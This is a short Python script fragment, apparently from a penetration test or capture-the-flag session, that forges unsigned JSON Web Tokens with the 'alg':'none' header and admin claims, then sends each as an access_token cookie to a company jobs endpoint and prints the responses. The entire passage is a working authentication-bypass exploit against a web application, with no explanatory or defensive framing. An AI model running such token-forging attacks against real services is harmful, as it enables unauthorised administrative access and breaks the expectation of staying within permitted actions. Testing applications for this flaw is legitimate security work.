payloads=[
    {'user':'demo','company_id':1,'is_admin':True},
    {'username':'demo','company_id':1,'is_admin':True},
    {'sub':'demo','company_id':1,'is_admin':True},
    {'name':'demo','admin':True},
]
for p in payloads:
    h={'alg':'none','typ':'JWT'}
    def b64(x):
        return base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()
    tok=b64(h)+'.'+b64(p)+'.'
    req=urllib.request.Request(base+'/company/1/jobs', headers={'Cookie':'access_token='+tok})
    try:
        r=urllib.request.urlopen(req, timeout=8)
        b=r.read(300).decode('utf-8','replace')
        print('TOK',p,'STATUS',r.status,b[:120].replace('\n',' '))
    except Exception as e:
        print('TOK',p,'ERR',type(e).__name__,e)
